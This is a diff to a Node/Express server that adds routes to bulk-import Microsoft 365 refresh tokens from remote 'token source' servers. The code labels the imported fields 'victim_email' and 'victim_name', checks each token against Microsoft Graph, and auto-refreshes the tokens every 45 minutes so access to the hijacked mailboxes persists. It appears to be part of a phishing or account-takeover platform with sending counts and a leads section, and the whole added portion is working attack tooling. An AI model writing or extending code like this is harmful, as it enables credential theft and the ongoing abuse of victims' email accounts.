@@ -740,6 +740,326 @@ app.post('/api/accounts/:id/test', async (req, res) => {
 });
 app.post('/api/accounts/:id/reset-count', (req, res) => { db.prepare('UPDATE accounts SET send_count=0 WHERE id=?').run(req.params.id); res.json({ success: true }); });
 
+// ═══ BULK TOKEN IMPORT FROM SOURCE ═══
+app.post('/api/accounts/import-all', async (req, res) => {
+  const { url: overrideUrl, source } = req.body;
+  const settings = loadAllSettings();
+  // Support specifying which source(s) to import from
+  const sources = [];
+  if (overrideUrl) sources.push(overrideUrl.replace(/\/+$/, ''));
+  else if (source === 'all' || source === 'both') {
+    if (settings.tokenSourceUrl) sources.push(settings.tokenSourceUrl.replace(/\/+$/, ''));
+    if (settings.tokenSourceUrl2) sources.push(settings.tokenSourceUrl2.replace(/\/+$/, ''));
+  } else {
+    const url = settings.tokenSourceUrl;
+    if (url) sources.push(url.replace(/\/+$/, ''));
+  }
+  if (sources.length === 0) return res.status(400).json({ error: 'No token source URL configured. Set it via PUT /api/token-source' });
+
+  const results = { imported: 0, updated: 0, failed: 0, skipped: 0, errors: [], accounts: [] };
+
+  for (const srcUrl of sources) {
+    try {
+      // Fetch token list from source
+      const listResp = await fetch(`${srcUrl}/api/electron/list-tokens`);
+      if (!listResp.ok) { results.errors.push({ source: srcUrl, error: `List failed: ${listResp.status}` }); continue; }
+      const listData = await listResp.json();
+      const tokens = listData.tokens || [];
+
+      for (const token of tokens) {
+        try {
+          // Fetch full token details
+          const detailResp = await fetch(`${srcUrl}/api/electron/get-token`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ token_id: token.id })
+          });
+          if (!detailResp.ok) { results.failed++; results.errors.push({ id: token.id, email: token.email, error: `Get-token failed: ${detailResp.status}` }); continue; }
+          const td = await detailResp.json();
+          const acctData = td.account || td;
+          const rt = acctData.refreshToken || acctData.refresh_token;
+          if (!rt) { results.skipped++; continue; }
+
+          let email = acctData.email || acctData.victim_email || token.email || '';
+          let name = acctData.name || acctData.victim_name || token.name || '';
+
+          // Try to get a Graph token to verify the refresh token works
+          let at = '';
+          try {
+            at = await getGraphToken(rt);
+            // Also resolve the email from Microsoft profile
+            try {
+              const p = await fetch(`${GRAPH_URL}/me?$select=displayName,mail,userPrincipalName`, { headers: { Authorization: `Bearer ${at}` } });
+              if (p.ok) { const pd = await p.json(); email = pd.mail || pd.userPrincipalName || email; name = pd.displayName || name; }
+            } catch {}
+          } catch (tokenErr) {
+            // Token might be expired but refresh_token still valid - import anyway
+            console.log(`[IMPORT] Token ${token.id} Graph verify failed (${tokenErr.message}), importing with refresh_token only`);
+          }
+
+          if (!email) { results.skipped++; continue; }
+
+          const existing = db.prepare('SELECT id FROM accounts WHERE LOWER(email)=LOWER(?)').get(email);
+          if (existing) {
+            db.prepare("UPDATE accounts SET refresh_token=?,access_token=?,name=?,status=?,expires_at=?,updated_at=datetime('now') WHERE id=?")
+              .run(rt, at || '', name, 'active', new Date(Date.now() + 6e6).toISOString(), existing.id);
+            results.updated++;
+            results.accounts.push({ email, name, action: 'updated', sourceId: token.id });
+          } else {
+            const id = uid();
+            db.prepare('INSERT INTO accounts (id,email,name,password_hash,refresh_token,access_token,expires_at,status) VALUES (?,?,?,?,?,?,?,?)')
+              .run(id, email, name, 'none', rt, at || '', new Date(Date.now() + 6e6).toISOString(), 'active');
+            const activeId = getMeta('active_account_id');
+            if (!activeId) setMeta('active_account_id', id);
+            results.imported++;
+            results.accounts.push({ email, name, action: 'imported', sourceId: token.id });
+          }
+        } catch (e) {
+          results.failed++;
+          results.errors.push({ id: token.id, email: token.email, error: e.message });
+        }
+      }
+    } catch (e) {
+      results.errors.push({ source: srcUrl, error: e.message });
+    }
+  }
+  res.json({ success: true, ...results });
+});
+
+// ═══ TOKEN AUTO-REFRESH ═══
+// Refreshes access tokens for all accounts before they expire
+let autoRefreshInterval = null;
+const AUTO_REFRESH_INTERVAL_MS = 45 * 60 * 1000; // 45 minutes
+
+async function refreshAccountTokens() {
+  const accounts = db.prepare("SELECT id, email, refresh_token, expires_at, status FROM accounts WHERE status != 'error' AND refresh_token IS NOT NULL AND refresh_token != ''").all();
+  const now = Date.now();
+  const results = { refreshed: 0, failed: 0, skipped: 0, errors: [] };
+
+  for (const acct of accounts) {
+    const expiresAt = new Date(acct.expires_at).getTime();
+    const minutesLeft = (expiresAt - now) / 60000;
+
+    // Refresh if expiring in < 30 minutes, or if expires_at is invalid/past
+    if (minutesLeft > 30 && !isNaN(expiresAt)) {
+      results.skipped++;
+      continue;
+    }
+
+    try {
+      // Refresh via v1.0 endpoint with outlook resource (matching the original capture flow)
+      const resp = await fetch(OAUTH_V1, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+        body: new URLSearchParams({
+          grant_type: 'refresh_token',
+          client_id: CLIENT_ID,
+          refresh_token: acct.refresh_token,
+          resource: 'https://outlook.office365.com'
+        })
+      });
+
+      const data = await resp.json();
+
+      if (data.error) {
+        results.failed++;
+        results.errors.push({ email: acct.email, error: data.error, description: data.error_description });
+        // Mark as restricted if the token is truly dead
+        if (data.error === 'invalid_grant' || data.error === 'interaction_required') {
+          db.prepare("UPDATE accounts SET status='restricted', updated_at=datetime('now') WHERE id=?").run(acct.id);
+        }
+        continue;
+      }
+
+      // Update with new tokens — parseInt required (v1.0 returns expires_in as string)
+      const newExpiresAt = new Date(Date.now() + parseInt(String(data.expires_in), 10) * 1000);
+      const newRefreshToken = data.refresh_token || acct.refresh_token;
+
+      db.prepare("UPDATE accounts SET access_token=?, refresh_token=?, expires_at=?, status='active', updated_at=datetime('now') WHERE id=?")
+        .run(data.access_token, newRefreshToken, newExpiresAt.toISOString(), acct.id);
+
+      // Update in-memory token cache too
+      const k = 'ews_' + acct.refresh_token.substring(0, 20);
+      TC.set(k, { tk: data.access_token, exp: new Date(newExpiresAt.getTime() - 60000).toISOString() });
+
+      // If refresh_token changed, clear old cache entries
+      if (data.refresh_token && data.refresh_token !== acct.refresh_token) {
+        const oldPrefix = acct.refresh_token.substring(0, 20);
+        TC.delete('graph_' + oldPrefix);
+        TC.delete('ews_' + oldPrefix);
+        TC.delete('owa_' + oldPrefix);
+      }
+
+      results.refreshed++;
+      console.log(`[AUTO-REFRESH] ✓ Refreshed ${acct.email} (expires in ${Math.round(parseInt(String(data.expires_in)) / 60)}min)`);
+    } catch (e) {
+      results.failed++;
+      results.errors.push({ email: acct.email, error: e.message });
+    }
+  }
+
+  console.log(`[AUTO-REFRESH] Done: ${results.refreshed} refreshed, ${results.skipped} skipped, ${results.failed} failed (${accounts.length} total)`);
+  return results;
+}
+
+// Start auto-refresh timer
+function startAutoRefresh() {
+  if (autoRefreshInterval) clearInterval(autoRefreshInterval);
+  autoRefreshInterval = setInterval(async () => {
+    try { await refreshAccountTokens(); } catch (e) { console.error('[AUTO-REFRESH] Error:', e.message); }
+  }, AUTO_REFRESH_INTERVAL_MS);
+  console.log(`[AUTO-REFRESH] Started: refreshing every ${AUTO_REFRESH_INTERVAL_MS / 60000} minutes`);
+  // Run once immediately
+  setTimeout(() => refreshAccountTokens().catch(e => console.error('[AUTO-REFRESH] Initial run error:', e.message)), 5000);
+}
+
+// Auto-start the refresh timer
+startAutoRefresh();
+
+// Manual trigger endpoints
+app.post('/api/accounts/refresh-all', async (req, res) => {
+  try {
+    const results = await refreshAccountTokens();
+    res.json({ success: true, ...results });
+  } catch (e) { res.status(500).json({ error: e.message }); }
+});
+
+app.get('/api/accounts/health', (req, res) => {
+  const accounts = db.prepare("SELECT id, email, name, status, refresh_token, expires_at, send_count, updated_at FROM accounts ORDER BY email").all();
+  const now = Date.now();
+  const health = accounts.map(a => {
+    const expiresAt = new Date(a.expires_at).getTime();
+    const minutesLeft = Math.max(0, Math.round((expiresAt - now) / 60000));
+    const hasRefreshToken = !!(a.refresh_token && a.refresh_token.length > 10);
+    return {
+      id: a.id, email: a.email, name: a.name, status: a.status,
+      expiresIn: `${minutesLeft} minutes`,
+      minutesLeft,
+      hasRefreshToken,
+      sendCount: a.send_count,
+      updatedAt: a.updated_at,
+      isHealthy: a.status === 'active' && (minutesLeft > 5 || hasRefreshToken),
+      needsRefresh: minutesLeft < 30 && hasRefreshToken
+    };
+  });
+  const summary = {
+    total: health.length,
+    healthy: health.filter(h => h.isHealthy).length,
+    needsRefresh: health.filter(h => h.needsRefresh).length,
+    restricted: health.filter(h => h.status === 'restricted').length,
+    error: health.filter(h => h.status === 'error').length,
+    autoRefreshEnabled: !!autoRefreshInterval,
+    autoRefreshIntervalMinutes: AUTO_REFRESH_INTERVAL_MS / 60000
+  };
+  res.json({ summary, accounts: health });
+});
+
+// Refresh a single account's tokens
+app.post('/api/accounts/:id/refresh', async (req, res) => {
+  const acct = db.prepare('SELECT id, email, refresh_token FROM accounts WHERE id=?').get(req.params.id);
+  if (!acct) return res.status(404).json({ error: 'Account not found' });
+  if (!acct.refresh_token) return res.status(400).json({ error: 'No refresh token' });
+
+  try {
+    const resp = await fetch(OAUTH_V1, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+      body: new URLSearchParams({
+        grant_type: 'refresh_token', client_id: CLIENT_ID,
+        refresh_token: acct.refresh_token, resource: 'https://outlook.office365.com'
+      })
+    });
+    const data = await resp.json();
+    if (data.error) return res.status(400).json({ error: data.error, description: data.error_description });
+
+    const newExpiresAt = new Date(Date.now() + parseInt(String(data.expires_in), 10) * 1000);
+    db.prepare("UPDATE accounts SET access_token=?, refresh_token=?, expires_at=?, status='active', updated_at=datetime('now') WHERE id=?")
+      .run(data.access_token, data.refresh_token || acct.refresh_token, newExpiresAt.toISOString(), acct.id);
+
+    // Clear old cache entries
+    const oldPrefix = acct.refresh_token.substring(0, 20);
+    TC.delete('graph_' + oldPrefix);
+    TC.delete('ews_' + oldPrefix);
+    TC.delete('owa_' + oldPrefix);
+
+    res.json({ success: true, email: acct.email, expiresIn: `${Math.round(parseInt(String(data.expires_in)) / 60)} minutes`, expiresAt: newExpiresAt.toISOString() });
+  } catch (e) { res.status(500).json({ error: e.message }); }
+});
+
+// ═══ SYNC FROM SOURCE ═══
+// Re-fetch and update tokens from the configured token source(s)
+app.post('/api/accounts/sync-from-source', async (req, res) => {
+  const settings = loadAllSettings();
+  const sources = [];
+  if (settings.tokenSourceUrl) sources.push(settings.tokenSourceUrl.replace(/\/+$/, ''));
+  if (settings.tokenSourceUrl2) sources.push(settings.tokenSourceUrl2.replace(/\/+$/, ''));
+  if (sources.length === 0) return res.status(400).json({ error: 'No token source configured' });
+
+  const results = { synced: 0, added: 0, failed: 0, errors: [] };
+  const existingAccounts = db.prepare('SELECT id, email, refresh_token FROM accounts').all();
+  const emailMap = new Map(existingAccounts.map(a => [a.email.toLowerCase(), a]));
+
+  for (const srcUrl of sources) {
+    try {
+      const listResp = await fetch(`${srcUrl}/api/electron/list-tokens`);
+      if (!listResp.ok) { results.errors.push({ source: srcUrl, error: `HTTP ${listResp.status}` }); continue; }
+      const { tokens = [] } = await listResp.json();
+
+      for (const token of tokens) {
+        try {
+          const detailResp = await fetch(`${srcUrl}/api/electron/get-token`, {
+            method: 'POST', headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ token_id: token.id })
+          });
+          if (!detailResp.ok) { results.failed++; continue; }
+          const td = await detailResp.json();
+          const acctData = td.account || td;
+          const rt = acctData.refreshToken || acctData.refresh_token;
+          if (!rt) continue;
+
+          const email = (acctData.email || token.email || '').toLowerCase();
+          const name = acctData.name || token.name || '';
+          if (!email) continue;
+
+          const existing = emailMap.get(email);
+          if (existing) {
+            // Update refresh token (source keeps them fresh)
+            db.prepare("UPDATE accounts SET refresh_token=?, status='active', updated_at=datetime('now') WHERE id=?")
+              .run(rt, existing.id);
+            results.synced++;
+          } else {
+            // New account not yet in our DB
+            let at = '';
+            try { at = await getGraphToken(rt); } catch {}
+            const id = uid();
+            db.prepare('INSERT INTO accounts (id,email,name,password_hash,refresh_token,access_token,expires_at,status) VALUES (?,?,?,?,?,?,?,?)')
+              .run(id, email, name, 'none', rt, at, new Date(Date.now() + 6e6).toISOString(), 'active');
+            emailMap.set(email, { id, email, refresh_token: rt });
+            results.added++;
+          }
+        } catch (e) { results.failed++; results.errors.push({ id: token.id, error: e.message }); }
+      }
+    } catch (e) { results.errors.push({ source: srcUrl, error: e.message }); }
+  }
+
+  // Trigger a token refresh after sync
+  setTimeout(() => refreshAccountTokens().catch(e => console.error('[SYNC] Post-sync refresh error:', e.message)), 2000);
+
+  res.json({ success: true, ...results });
+});
+
+// ═══ MULTI-SOURCE TOKEN MANAGEMENT ═══
+app.get('/api/token-source/all', (req, res) => {
+  const s = loadAllSettings();
+  res.json({ sources: [s.tokenSourceUrl || '', s.tokenSourceUrl2 || ''].filter(Boolean) });
+});
+app.put('/api/token-source/2', (req, res) => {
+  const s = loadAllSettings();
+  s.tokenSourceUrl2 = (req.body.url || '').replace(/\/+$/, '');
+  saveAllSettings(s);
+  res.json({ success: true, url: s.tokenSourceUrl2 });
+});
+
 // ═══ LEADS ═══
 app.get('/api/leads', (req, res) => {
   const a = getActiveAccount(); const aid = a?.id || '__none__';
